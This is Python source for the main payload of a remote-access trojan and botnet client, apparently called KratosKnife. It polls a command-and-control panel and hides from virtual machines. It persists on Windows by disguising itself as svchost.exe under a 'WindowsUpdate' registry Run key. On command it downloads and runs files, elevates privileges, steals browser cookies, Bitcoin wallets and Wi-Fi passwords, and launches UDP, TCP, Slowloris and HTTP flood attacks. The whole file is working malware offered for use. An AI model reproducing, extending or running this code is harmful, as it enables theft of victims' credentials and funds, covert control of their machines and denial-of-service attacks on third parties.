import requests, base64, os, time, subprocess, hashlib, re, shutil, sys, webbrowser
import ctypes   #To find user privileges i.e. User/Administrator
import tempfile # Used to find temp directory pathimport webbrowser  # To open Attacker Website in Browser 
from mss import mss   # To capture screenshot

from BypassVM import BypassVM  # Used to Execute Clients CMD
from ClientsCMD import ClientsCMD  # Used to Check For VM
from ComputerCMD import ComputerCMD # User to Execute Computer CMD 
from DDOS import DDOS              # User to Execute DDOS CMD
from HTTPSocket import HTTPSocket  # Used to Make Connection With C&C
from Stealer import Stealer        # User to Execute Stealer CMD   
 
class Payload:
    def __init__(self, panelURL):
        self.Y = "|BN|"                        # Delimiter; used to break RECIEVED COMMAND into LIST OF COMMAND 
        self.panelURL = panelURL               # C&C Panel URL
        self.machineID = self.gen_machine_id()   # Generates Machine ID of Victim's Device
        self.username = os.getenv("USERNAME")  # Retrives Username of Victim's Device
        self.operatingSystem = self.find_operating_system()   # Find OperatingSystem of Victim
        self.tempdir = tempfile.gettempdir()
        
        self.params_for_getCommand = { 'id' : base64.b64encode(str(self.machineID).encode('UTF-8'))}

        self.C = HTTPSocket(self.panelURL, str(self.machineID))   # Initiate HTTPSocket Class
        self.Stealer = Stealer(self.panelURL, str(self.machineID))         # Initiate Stealer Class
        self.DDOS = DDOS(self.panelURL, str(self.machineID))               # Initiate DDOS Class        
        self.ClientsCMD = ClientsCMD(self.panelURL, str(self.machineID))   # Initiate ClientsCMD Class
        self.ComputerCMD = ComputerCMD(self.panelURL, str(self.machineID)) # Initiate ComputerCMD Class

    def detect_vm_and_quit(self):
        checkVM = BypassVM()
        checkVM.registry_check()
        checkVM.processes_and_files_check()
        checkVM.mac_check()            

    def become_persistent(self, time_persistent):
        evil_file_location = os.environ["appdata"] + "\\svchost.exe"
        persistence_registry_name = "WindowsUpdate"
        
        persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
        
        if not os.path.exists(evil_file_location):
            cmd = persistenceCMD
            time.sleep(time_persistent)
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(cmd, shell=True)


    def gen_machine_id(self):
        current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        m = hashlib.md5()
        m.update(current_machine_id.encode('UTF-8'))
        unique_md5_hash = m.hexdigest()
        return unique_md5_hash   #Machine ID  
        
    def find_operating_system(self):
        if os.name == "posix":
            operatingSystem = "GNU/LINUX"
        elif os.name == 'nt':
            operatingSystem = "Microsoft Windows"
        else:
            operatingSystem = "MacOS" 
        return operatingSystem
        
    def find_antivirus(self):
        command_to_find_AV = "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
        AV_List = subprocess.check_output(command_to_find_AV, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        AV_List = AV_List.decode(encoding="utf-8", errors="strict") 
        AV_List = AV_List.strip()
        AV_name = re.findall("(?:displayName=)(.*)", str(AV_List))
        AV_name = AV_name[0]
        
        return AV_name
        
    def find_user_privilege(self):
        user_status = ctypes.windll.shell32.IsUserAnAdmin()
        if user_status == 0:
            privilege = "User"
        elif user_status == 1:
            privilege = "Administrator"
        
        return privilege        

    def connect(self):
        Y               = str(self.Y)
        VictimID        = str(self.machineID)
        ComputerName    = str(self.username)
        OperatingSystem = str(self.operatingSystem)
        Antivirus       = str(self.find_antivirus())
        Status          = "Online"
        IsUSB           = "No"
        IsAdmin         = str(self.find_user_privilege())
        
        data = VictimID + Y + ComputerName + Y + OperatingSystem + Y + Antivirus + Y + Status + Y + IsUSB + Y + IsAdmin
        #Data = MachineID + ComputerName + OS + AntiVirus + Status(Online/Offline) + IsUSB + IsAdmin
        self.C.Connect(data)  

    def start(self):        
        status = True
        while status == True:
            commands = requests.get(str(self.panelURL) + "/getCommand.php?id=" , self.params_for_getCommand)
            split_command = str(base64.b64decode(commands.text + "=="))
            split_command = split_command.split('\'')[1].split(self.Y)  #Makes Command String to Command List
            
            print(f"[*] Recived Command List : {split_command}")

            #=============================================================================================
            # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
            #=============================================================================================

            if split_command[0] == '':
                print("")
                self.C.Send("CleanCommands")

            if split_command[0] == "Ping":
                self.C.Send("Ping")
                
            if split_command[0] == "UploadFile":    
                self.ClientsCMD.upload_and_execute_file(split_command[1], split_command[2])  #upload_and_execute_file(file_url, file_new_name)

            if split_command[0] == "ShowMessageBox":
                msg        = split_command[1]
                title      = split_command[2]
                iconType   = split_command[3]
                buttonType = split_command[4]
                self.ClientsCMD.show_message_box(msg, title, iconType, buttonType)
                
            if split_command[0] == "Screenshot":
                self.ClientsCMD.take_screenshot()

            if split_command[0] == "InstalledSoftwares":
                self.ClientsCMD.get_program_list()  

            if split_command[0] == "ExecuteScript":
                script_type = split_command[1] # bat/vbs/ps1
                script_name = split_command[2] # Anytext
                self.ClientsCMD.execute_script(script_type, script_name)
            
            if split_command[0] == "Elevate":
                try:
                    print("[*] Elevating USER Status ...")
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    self.C.Log("Succ", "Elevated USER Status Successfully")
                    self.C.Send("CleanCommands")   
                    sys.exit()
                except Exception as e:
                    print("[Error In KratosKnife, Elevate CMD]")
                    print(f"[Error] : {e}")
                    self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
            
            if split_command[0] == "CleanTemp":
                self.ClientsCMD.clear_temp_directory()                

            #=============================================================================================
            # Below Codes to Checks for "Location" Section CMD One-By-One 
            #=============================================================================================      
            
            if split_command[0] == "GetLocation":
                self.ClientsCMD.get_device_location()                

            #=============================================================================================
            # Below Codes to Checks for "Stealer" Section CMD One-By-One 
            #=============================================================================================            

            if split_command[0] == "StealChCookies":
                self.Stealer.steal_chrome_cookie()
                
            if split_command[0] == "StealCookie":
                self.Stealer.steal_firefox_cookie()
                
            if split_command[0] == "StealBitcoin":
                self.Stealer.steal_bitcoin_wallet()
                    
            if split_command[0] == "StealWifiPassword":
                self.Stealer.steal_wifi_password()

            #=============================================================================================
            # Below Codes to Checks for "Open Webpage" Section CMD One-By-One
            #=============================================================================================                        

            if split_command[0] == "OpenPage":
                print(f"[*] Opening Website : {split_command[1]}")
                try:
                    webbrowser.open(split_command[1])            
                    self.C.Send("CleanCommands")
                    self.C.Log("Succ", "Webpage has been opened in visable mode")
                except Exception as e:
                    print("[Error In KratosKnife, OpenPage CMD]")
                    print(f"Error : {e}")
                    self.C.Log("Fail", "An unexpected error occurred " + e)

            #=============================================================================================
            # Below Codes to Checks for "DDOS Attack" Section CMD One-By-One
            #=============================================================================================         

            if split_command[0] == "StartDDOS":
                target_host         = split_command[2]
                thread_number       = split_command[3]
                max_timeout_number  = split_command[4]
            
                if split_command[1] == "UDPAttack":
                    self.DDOS.UDP_attack(target_host, thread_number, max_timeout_number)                
                    
                if split_command[1] == "TCPAttack":
                    self.DDOS.TCP_attack(target_host, thread_number, max_timeout_number)
                    
                if split_command[1] == "ARMEAttack":
                    self.DDOS.ARME_attack(target_host, thread_number, max_timeout_number)
                    
                if split_command[1] == "SlowlorisAttack":
                    self.DDOS.Slowloris_attack(target_host, thread_number, max_timeout_number)                
                    
                if split_command[1] == "PostHTTPAttack":
                    self.DDOS.PostHTTP_attack(target_host, thread_number, max_timeout_number)
                    
                if split_command[1] == "HTTPGetAttack":
                    self.DDOS.HTTPGet_attack(target_host, thread_number, max_timeout_number)
                    
                if split_command[1] == "BWFloodAttack":
                    self.DDOS.BandwidthFlood_attack(target_host, thread_number, max_timeout_number)

            #=============================================================================================
            # Below Codes to Checks for "Computer Commands" Section CMD One-By-One
            #============================================================================================= 
            if split_command[0] == "Shutdown":
                self.ComputerCMD.shutdown()

            if split_command[0] == "Logoff":
                self.ComputerCMD.logoff()
                
            if split_command[0] == "Restart":
                self.ComputerCMD.restart()
             
            #=============================================================================================
            # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
            #=============================================================================================
 
            if split_command[0] == "Close":
                self.ClientsCMD.close_connection()
                sys.exit()
                
            if split_command[0] == "MoveClient":
                newPanelURL = split_command[1]
                if newPanelURL[:-1] != "/":
                    newPanelURL = newPanelURL + "/"
                if newPanelURL[:7] != "http://" and newPanelURL[:8] != "https://":
                    newPanelURL = "http://" + newPanelURL
                self.ClientsCMD.moveclient(newPanelURL)

            if split_command[0] == "Blacklist":
                self.C.Send("CleanCommands")
                
            if split_command[0] == "UpdateClient":
                self.C.Send("CleanCommands")
                
            if split_command[0] == "Restart":
                self.C.Send("CleanCommands")
 
            if split_command[0] == "Uninstall":
                self.C.Send("Uninstall")
                sys.exit()


        
            time.sleep(5)        
    
        
if __name__ == '__main__':
    def payload():
        try:
            test = Payload("http://localhost/BPanel/")
            test.detect_vm_and_quit()
            #test.become_persistent(10) #Takes Time In Seconds after which it executes persistence method
            test.connect()
            test.start() 
        except Exception as e:
            if str(e)[:18] == "HTTPConnectionPool":
                print("[*] Offline, Trying to Connection After 10 Sec")
                time.sleep(10)
                payload()
            else:
                print(f"[Error] : {e}")
                sys.exit()
        
        except KeyboardInterrupt:
            sys.exit()

    payload()
    

    